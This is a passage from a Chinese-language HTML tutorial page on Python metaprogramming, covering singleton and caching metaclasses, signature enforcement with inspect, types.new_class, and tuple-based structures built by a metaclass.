class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        self.__instance = <span class="literal">None</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.__instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.__instance = super().__call__(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> self.__instance</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.__instance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(metaclass=Singleton)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Creating Spam'</span>)</span><br></pre></td></tr></table></figure><p>这样<code>Spam</code>类就只能创建唯一的实例了，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Spam()</span><br><span class="line">Creating Spam</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> c</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果想创建缓存实例，可以通过元类来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weakref</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cached</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.__cache = weakref.WeakValueDictionary()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> args <span class="keyword">in</span> self.__cache:</span><br><span class="line">            <span class="keyword">return</span> self.__cache[args]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            obj = super().__call__(*args)</span><br><span class="line">            self.__cache[args] = obj</span><br><span class="line">            <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(metaclass=Cached)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        print(<span class="string">'Creating Spam(&#123;!r&#125;)'</span>.format(name))</span><br><span class="line">        self.name = name</span><br></pre></td></tr></table></figure><p>测试如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Spam(<span class="string">'Guido'</span>)</span><br><span class="line">Creating Spam(<span class="string">'Guido'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = Spam(<span class="string">'Diana'</span>)</span><br><span class="line">Creating Spam(<span class="string">'Diana'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Spam(<span class="string">'Guido'</span>) <span class="comment"># 缓存</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> c <span class="comment"># 返回的是缓存的值</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="args和-kwargs的强制参数签名"><a href="#args和-kwargs的强制参数签名" class="headerlink" title="args和*kwargs的强制参数签名"></a><em>args和*</em>kwargs的强制参数签名</h4><p>对任何涉及到操作函数调用签名的问题，都应该使用<code>inspect</code>模块中的签名特性。我们最主要关注两个类：<code>Signature</code>和<code>Parameter</code>。下面是一个创建函数前面的交互例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> inspect <span class="keyword">import</span> Signature, Parameter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Make a signature for a func(x, y=42, *, z=None)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parms = [ Parameter(<span class="string">'x'</span>, Parameter.POSITIONAL_OR_KEYWORD),</span><br><span class="line"><span class="meta">... </span>        Parameter(<span class="string">'y'</span>, Parameter.POSITIONAL_OR_KEYWORD, default=<span class="number">42</span>),</span><br><span class="line"><span class="meta">... </span>        Parameter(<span class="string">'z'</span>, Parameter.KEYWORD_ONLY, default=<span class="literal">None</span>) ]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sig = Signature(parms)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(sig)</span><br><span class="line">(x, y=<span class="number">42</span>, *, z=<span class="literal">None</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>一旦有了一个签名对象，你就可以使用它的<code>bind()</code>方法很容易的将它绑定到<code>*args</code>和<code>**kwargs</code>上去。下面是一个简单的演示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"><span class="meta">... </span>    bound_values = sig.bind(*args, **kwargs)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> name, value <span class="keyword">in</span> bound_values.arguments.items():</span><br><span class="line"><span class="meta">... </span>        print(name,value)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Try various examples</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, <span class="number">2</span>, z=<span class="number">3</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line">y <span class="number">2</span></span><br><span class="line">z <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, z=<span class="number">3</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line">z <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(y=<span class="number">2</span>, x=<span class="number">1</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line">y <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">    File <span class="string">"/usr/local/lib/python3.3/inspect.py"</span>, line <span class="number">1972</span>, <span class="keyword">in</span> _bind</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'too many positional arguments'</span>)</span><br><span class="line">TypeError: too many positional arguments</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(y=<span class="number">2</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">    File <span class="string">"/usr/local/lib/python3.3/inspect.py"</span>, line <span class="number">1961</span>, <span class="keyword">in</span> _bind</span><br><span class="line">        <span class="keyword">raise</span> TypeError(msg) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">TypeError: <span class="string">'x'</span> parameter lacking default value</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, y=<span class="number">2</span>, x=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">    File <span class="string">"/usr/local/lib/python3.3/inspect.py"</span>, line <span class="number">1985</span>, <span class="keyword">in</span> _bind</span><br><span class="line">        <span class="string">'&#123;arg!r&#125;'</span>.format(arg=param.name))</span><br><span class="line">TypeError: multiple values <span class="keyword">for</span> argument <span class="string">'x'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>可以看出来，通过将签名和传递的参数绑定起来，可以强制函数调用遵循特定的规则，比如必填、默认、重复等等。<br>下面是一个强制函数签名更具体的例子。在代码中，我们在基类中先定义了一个非常通用的<code>__init__()</code>方法，然后强制所有的子类必须提供一个特定的参数签名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> Signature, Parameter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_sig</span><span class="params">(*names)</span>:</span></span><br><span class="line">    parms = [Parameter(name, Parameter.POSITIONAL_OR_KEYWORD)</span><br><span class="line">            <span class="keyword">for</span> name <span class="keyword">in</span> names]</span><br><span class="line">    <span class="keyword">return</span> Signature(parms)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Structure</span>:</span></span><br><span class="line">    __signature__ = make_sig()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        bound_values = self.__signature__.bind(*args, **kwargs)</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> bound_values.arguments.items():</span><br><span class="line">            setattr(self, name, value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(Structure)</span>:</span></span><br><span class="line">    __signature__ = make_sig(<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(Structure)</span>:</span></span><br><span class="line">    __signature__ = make_sig(<span class="string">'x'</span>, <span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><p>下面是使用这个<code>Stock</code>类的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> inspect</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(inspect.signature(Stock))</span><br><span class="line">(name, shares, price)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = Stock(<span class="string">'ACME'</span>, <span class="number">100</span>, <span class="number">490.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = Stock(<span class="string">'ACME'</span>, <span class="number">100</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">TypeError: <span class="string">'price'</span> parameter lacking default value</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s3 = Stock(<span class="string">'ACME'</span>, <span class="number">100</span>, <span class="number">490.1</span>, shares=<span class="number">50</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">TypeError: multiple values <span class="keyword">for</span> argument <span class="string">'shares'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="在类上强制使用编程规约"><a href="#在类上强制使用编程规约" class="headerlink" title="在类上强制使用编程规约"></a>在类上强制使用编程规约</h4><p>如果想监控类的定义，通常可以通过定义一个元类。一个基本元类通常是继承自<code>type</code>并重定义它的<code>__new__()</code>方法 或者是<code>__init__()</code>方法。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMeta</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(self, clsname, bases, clsdict)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> super().__new__(cls, clsname, bases, clsdict)</span><br></pre></td></tr></table></figure><p>另一种是，定义<code>__init__()</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMeta</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, clsname, bases, clsdict)</span>:</span></span><br><span class="line">        super().__init__(clsname, bases, clsdict)</span><br></pre></td></tr></table></figure><p>为了使用这个元类，通常要将它放到到一个顶级父类定义中，然后其他的类继承这个顶级父类。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Root</span><span class="params">(metaclass=MyMeta)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(Root)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(Root)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>元类的一个关键特点是它允许你在定义的时候检查类的内容。在重新定义<code>__init__()</code>方法中，你可以很轻松的检查类字典、父类等等。并且，一旦某个元类被指定给了某个类，那么就会被继承到所有子类中去。因此，一个框架的构建者就能在大型的继承体系中通过给一个顶级父类指定一个元类去捕获所有下面子类的定义。</p><p>在元类中选择重新定义<code>__new__()</code>方法还是<code>__init__()</code>方法取决于你想怎样使用结果类。<code>__new__()</code>方法在类创建之前被调用，通常用于通过某种方式修改类的定义。 而<code>__init__()</code>方法是在类被创建之后被调用，当你需要完整构建类对象的时候会很有用。 在最后一个例子中，这是必要的，因为它使用了<code>super()</code>函数来搜索之前的定义。它只能在类的实例被创建之后，并且相应的方法解析顺序也已经被设置。</p><h4 id="以编程方式定义类"><a href="#以编程方式定义类" class="headerlink" title="以编程方式定义类"></a>以编程方式定义类</h4><p>可以使用函数<code>types.new_class()</code>来初始化新的类对象。 你需要做的只是提供类的名字、父类元组、关键字参数，以及一个用成员变量填充类字典的回调函数。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, shares, price)</span>:</span></span><br><span class="line">    self.name = name</span><br><span class="line">    self.shares = shares</span><br><span class="line">    self.price = price</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.shares * self.price</span><br><span class="line"></span><br><span class="line">cls_dict = &#123;</span><br><span class="line">    <span class="string">'__init__'</span> : __init__,</span><br><span class="line">    <span class="string">'cost'</span> : cost,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line">Stock = types.new_class(<span class="string">'Stock'</span>, (), &#123;&#125;, <span class="keyword">lambda</span> ns: ns.update(cls_dict))</span><br><span class="line">Stock.__module__ = __name__</span><br></pre></td></tr></table></figure><p>这种方式会构建一个普通的类对象，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&lt;stock.Stock object at <span class="number">0x1006a9b10</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.cost()</span><br><span class="line"><span class="number">4555.0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>这种方法中，一个比较难理解的地方是在调用完<code>types.new_class()</code>对<code>Stock.__module__</code>的赋值。每次当一个类被定义后，它的<code>__module__</code>属性包含定义它的模块名。这个名字用于生成<code>__repr__()</code>方法的输出。它同样也被用于很多库，比如<code>pickle</code>。因此，为了让你创建的类是“正确”的，你需要确保这个属性也设置正确了。</p><p>如果你想创建的类需要一个不同的元类，可以通过<code>types.new_class()</code>第三个参数传递给它。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> abc</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Stock = types.new_class(<span class="string">'Stock'</span>, (), &#123;<span class="string">'metaclass'</span>: abc.ABCMeta&#125;,</span><br><span class="line"><span class="meta">... </span>                        <span class="keyword">lambda</span> ns: ns.update(cls_dict))</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Stock.__module__ = __name__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Stock</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Stock</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span><span class="params">(Stock)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">abc</span>.<span class="title">ABCMeta</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>第三个参数还可以包含其他的关键字参数。比如，一个类的定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(Base, debug=True, typecheck=False)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>那么可以将其翻译成如下的<code>new_class()</code>调用形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Spam = types.new_class(<span class="string">'Spam'</span>, (Base,),</span><br><span class="line">                        &#123;<span class="string">'debug'</span>: <span class="literal">True</span>, <span class="string">'typecheck'</span>: <span class="literal">False</span>&#125;,</span><br><span class="line">                        <span class="keyword">lambda</span> ns: ns.update(cls_dict))</span><br></pre></td></tr></table></figure><p><code>new_class()</code>第四个参数最神秘，它是一个用来接受类命名空间的映射对象的函数。通常这是一个普通的字典，但是它实际上是<code>__prepare__()</code>方法返回的任意对象，这个函数需要使用<code>update()</code>方法给命名空间增加内容。</p><h4 id="在定义的时候初始化类的成员"><a href="#在定义的时候初始化类的成员" class="headerlink" title="在定义的时候初始化类的成员"></a>在定义的时候初始化类的成员</h4><p>如果想在类被定义的时候就初始化一部分类的成员，而不是要等到实例被创建后。下面是一个例子，利用这个思路来创建类似于<code>collections</code>模块中的命名元组的类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StructTupleMeta</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">for</span> n, name <span class="keyword">in</span> enumerate(cls._fields):</span><br><span class="line">            setattr(cls, name, property(operator.itemgetter(n)))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StructTuple</span><span class="params">(tuple, metaclass=StructTupleMeta)</span>:</span></span><br><span class="line">    _fields = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, *args)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(args) != len(cls._fields):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'&#123;&#125; arguments required'</span>.format(len(cls._fields)))</span><br><span class="line">        <span class="keyword">return</span> super().__new__(cls,args)</span><br></pre></td></tr></table></figure><p>这段代码可以用来定义简单的基于元组的数据结构，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(StructTuple)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(StructTuple)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'x'</span>, <span class="string">'y'</span>]</span><br></pre></td></tr></table></figure><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">0</span>]</span><br><span class="line"><span class="string">'ACME'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.name</span><br><span class="line"><span class="string">'ACME'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.shares * s.price</span><br><span class="line"><span class="number">4555.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.shares = <span class="number">23</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: can<span class="string">'t set attribute</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>这一小节中，类<code>StructTupleMeta</code>获取到类属性<code>_fields</code>中的属性名字列表，然后将它们转换成相应的可访问特定元组槽的方法。函数<code>operator.itemgetter()</code>创建一个访问器函数， 然后<code>property()</code>函数将其转换成一个属性。</p><p>比较难懂的部分是知道不同的初始化步骤是什么时候发生的。<code>StructTupleMeta</code>中的<code>__init__()</code>方法只在每个类被定义时被调用一次。<code>cls</code>参数就是那个被定义的类。实际上，上述代码使用了<code>_fields</code>类变量来保存新的被定义的类，然后给它再添加一点新的东西。</p><p><code>StructTuple</code>类作为一个普通的基类，供其他使用者来继承。这个类中的<code>__new__()</code>方法用来构造新的实例。这里使用<code>__new__()</code>并不是很常见，主要是因为我们要修改元组的调用签名，使得我们可以像普通的实例调用那样创建实例。就像下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>) <span class="comment"># OK</span></span><br><span class="line">s = Stock((<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)) <span class="comment"># Error</span></span><br></pre></td></tr></table></figure><p>跟<code>__init__()</code>不同的是，<code>__new__()</code>方法在实例被创建之前被触发。由于元组是不可修改的，所以一旦它们被创建了就不可能对它做任何改变。而<code>__init__()</code>会在实例创建的最后被触发，这也是为什么<code>__new__()</code>方法已经被定义了。</p><h4 id="避免重复的属性方法"><a href="#避免重复的属性方法" class="headerlink" title="避免重复的属性方法"></a>避免重复的属性方法</h4><p>考虑下一个简单的类，它的属性由属性方法包装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name ,age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'name must be a string'</span>)</span><br><span class="line">        self._name = value</span><br><span class="line"></span><br><span 